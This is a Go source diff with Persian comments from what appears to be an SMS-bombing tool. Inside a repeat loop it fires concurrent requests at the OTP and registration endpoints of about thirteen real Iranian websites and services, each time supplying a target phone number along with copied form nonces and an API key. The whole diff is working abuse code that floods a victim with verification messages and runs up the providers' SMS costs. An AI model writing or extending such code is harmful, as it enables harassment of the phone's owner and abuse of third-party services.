@@ -345,51 +345,189 @@ cookieJar, _ := cookiejar.New(nil)
 
 	for i := 0; i < repeatCount; i++ {
 
-
-
-			// فلایتیو اپ (Flightio App) - POST JSON
+// --- سرویس 1: MCIShop (همان کد قبلی) ---
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
 				payload := map[string]interface{}{
-					"userKey":     phone, // فرمت 09...
-					"userKeyType": 1,
-				}
-				sendJSONRequest(c, ctx, "https://app.flightio.com/bff/Authentication/CheckUserKey", payload, &wg, ch)
-			}
-		}(client)
-
-		// فلایتیو (Flightio) - POST JSON
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				payload := map[string]interface{}{
-					"userKey": phone, // فرمت 09...
-				}
-				sendJSONRequest(c, ctx, "https://flightio.com/bff/Authentication/CheckUserKey", payload, &wg, ch)
-			}
-		}(client)
-
-		// ام سی آی شاپ (MCIShop) - POST JSON
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				payload := map[string]interface{}{
-					"msisdn": phone, // فرمت 09...
+					"msisdn": phone, // فرمت 09... (شماره ورودی خام)
 				}
 				sendJSONRequest(c, ctx, "https://api-ebcom.mci.ir/services/auth/v1.0/otp", payload, &wg, ch)
 			}
 		}(client)
-		// نماوا (Namava) - POST Form (بر اساس حدس از کد PHP)
+
+
+		// --- سرویس 2: LivarFars (Step 1 - Request OTP) ---
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
-				formData := url.Values{}
-				// فرمت +989...
-				formData.Set("UserName", getPhoneNumberPlus98NoZero(phone))
-				sendFormRequest(c, ctx, "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request", formData, &wg, ch)
+				formData := url.Values{
+					"digt_countrycode":      {"+98"},
+					"phone":                 {getPhoneNumberNoZero(phone)}, // فرمت 9...
+					"digits_process_register": {"1"},
+					"instance_id":           {"c615328f4685ecfc0bb3378a99c1cc44"}, // توجه: احتمال داینامیک بودن
+					"optional_data":         {"optional_data"},
+					"action":                {"digits_forms_ajax"},
+					"type":                  {"register"},
+					"dig_otp":               {""},
+					"digits":                {"1"},
+					"digits_redirect_page":  {"//livarfars.ir/product-category/electronic-devices/wearable-gadget/?page=2&redirect_to=https%3A%2F%2Flivarfars.ir%2Fproduct-category%2Felectronic-devices%2Fwearable-gadget%2F"}, // توجه: احتمال داینامیک بودن
+					"digits_form":           {"673112fec7"}, // توجه: احتمال داینامیک بودن
+					"_wp_http_referer":      {"/product-category/electronic-devices/wearable-gadget/?login=true&page=2&redirect_to=https%3A%2F%2Flivarfars.ir%2Fproduct-category%2Felectronic-devices%2Fwearable-gadget%2F"}, // توجه: احتمال داینامیک بودن
+				}
+				sendFormRequest(c, ctx, "https://livarfars.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
 			}
 		}(client)
+
+		// --- سرویس 3: Ashraafi (Check Phone) ---
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				formData := url.Values{
+					"action":       {"check_phone_number"},
+					"phone_number": {phone}, // فرمت 09...
+				}
+				sendFormRequest(c, ctx, "https://ashraafi.com/wp-admin/admin-ajax.php", formData, &wg, ch)
+			}
+		}(client)
+
+		// --- سرویس 4: Ashraafi (Send OTP) ---
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				formData := url.Values{
+					"action":       {"send_verification_code"},
+					"phone_number": {phone}, // فرمت 09...
+				}
+				sendFormRequest(c, ctx, "https://ashraafi.com/wp-admin/admin-ajax.php", formData, &wg, ch)
+			}
+		}(client)
+
+		// --- سرویس 5: Moshaveran724 (Validate) ---
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				formData := url.Values{
+					"number": {phone}, // فرمت 09...
+					"cache":  {"false"},
+				}
+				sendFormRequest(c, ctx, "https://moshaveran724.ir/m/uservalidate.php", formData, &wg, ch)
+			}
+		}(client)
+
+		// --- سرویس 6: Moshaveran724 (PMS) ---
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				formData := url.Values{
+					"number": {phone}, // فرمت 09...
+					"cache":  {"false"},
+				}
+				sendFormRequest(c, ctx, "https://moshaveran724.ir/m/pms.php", formData, &wg, ch)
+			}
+		}(client)
+
+		// --- سرویس 7: SimkhanAPI ---
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				payload := map[string]interface{}{
+					"mobileNumber": phone, // فرمت 09...
+					"key":          "16a85bef-70be-41b2-934b-994e2aa113b7", // توجه: احتمال داینامیک بودن/کلید API
+					"ReSendSMS":    false,
+				}
+				sendJSONRequest(c, ctx, "https://simkhanapi.ir/api/users/registerV2", payload, &wg, ch)
+			}
+		}(client)
+
+		// --- سرویس 8: Pakhsh.Shop (OTP Request) ---
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				formData := url.Values{
+					"digt_countrycode":      {"+98"},
+					"phone":                 {getPhoneNumberNoZero(phone)}, // فرمت 9...
+					"digits_reg_name":       {"ghbfgf"}, // توجه: احتمال داینامیک بودن
+					"digits_process_register": {"1"},
+					"instance_id":           {"d49463434e4d494fa93e5f6a1bdcd189"}, // توجه: احتمال داینامیک بودن
+					"optional_data":         {"optional_data"},
+					"action":                {"digits_forms_ajax"},
+					"type":                  {"register"},
+					"dig_otp":               {""},
+					"digits":                {"1"},
+					"digits_redirect_page":  {"//pakhsh.shop/?page=1&redirect_to=https%3A%2F%2Fpakhsh.shop%2F"},
+					"digits_form":           {"65ecb01c4f"}, // توجه: احتمال داینامیک بودن
+					"_wp_http_referer":      {"/?login=true&page=1&redirect_to=https%3A%2F%2Fpakhsh.shop%2F"},
+				}
+				sendFormRequest(c, ctx, "https://pakhsh.shop/wp-admin/admin-ajax.php", formData, &wg, ch)
+			}
+		}(client)
+
+		// --- سرویس 9: Doctoreto ---
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				payload := map[string]interface{}{
+					"mobile":     getPhoneNumberNoZero(phone), // فرمت 9...
+					"country_id": 205,
+					"captcha":    "", // توجه: فیلد Captcha احتمالاً لازم است
+				}
+				sendJSONRequest(c, ctx, "https://api.doctoreto.com/api/web/patient/v1/accounts/register", payload, &wg, ch)
+			}
+		}(client)
+
+		// --- سرویس 10: Backend.Digify.Shop ---
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				payload := map[string]interface{}{
+					"phone_number": phone, // فرمت 09...
+				}
+				sendJSONRequest(c, ctx, "https://backend.digify.shop/user/merchant/otp/", payload, &wg, ch)
+			}
+		}(client)
+
+		// --- سرویس 11: WatchOnline.Shop ---
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				payload := map[string]interface{}{
+					"mobile": phone, // فرمت 09...
+				}
+				sendJSONRequest(c, ctx, "https://api.watchonline.shop/api/v1/otp/request", payload, &wg, ch)
+			}
+		}(client)
+
+		// --- سرویس 12: Offch.com ---
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				formData := url.Values{
+					"1_username":    {phone}, // فرمت 09...
+					"1_invite_code": {""},
+				}
+				sendFormRequest(c, ctx, "https://www.offch.com/login", formData, &wg, ch)
+			}
+		}(client)
+
+
+		// --- سرویس 13: Glite.ir ---
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				formData := url.Values{
+					"action":         {"mreeir_send_sms"},
+					"mobileemail":    {phone}, // فرمت 09...
+					"userisnotauser": {""},
+					"type":           {"mobile"},
+					"captcha":        {""},   // توجه: احتمال داینامیک بودن/لازم بودن Captcha
+					"captchahash":    {""},   // توجه: احتمال داینامیک بودن Captcha Hash
+					"security":       {"5881793717"}, // توجه: احتمال بسیار زیاد داینامیک بودن (Session Token?)
+				}
+				sendFormRequest(c, ctx, "https://www.glite.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
+			}
+		}(client)
+
 	}
 	close(tasks)
 
